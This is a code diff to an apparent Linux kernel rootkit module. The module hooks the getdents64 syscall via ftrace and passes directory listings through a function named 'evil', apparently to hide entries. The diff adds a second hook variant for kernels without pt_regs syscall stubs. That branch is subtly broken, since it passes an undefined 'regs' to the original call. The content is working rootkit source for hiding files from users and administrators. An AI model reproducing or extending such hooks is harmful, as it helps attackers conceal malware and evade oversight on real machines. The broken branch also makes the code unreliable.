@@ -67,7 +67,7 @@ int evil(struct linux_dirent __user * dirent, int res) {
 	    kfree(kdirent);
     return res;
 }
-
+#ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);
 
 static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
@@ -87,6 +87,26 @@ static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
     
     return res;
 }
+#else
+static asmlinkage long (*orig_sys_getdents64)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+
+static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+    int res;
+    
+    res = orig_sys_getdents64(regs);
+
+    printk(KERN_DEBUG "orig_sys_getdents64 done\n");
+
+    if (res <= 0){
+        // The original getdents failed - we aint mangling with that.
+		return res;
+    }
+
+    res = evil(dirent, res);
+    
+    return res;
+}
+#endif
 
 
 static struct ftrace_hook syscall_hooks[] = {
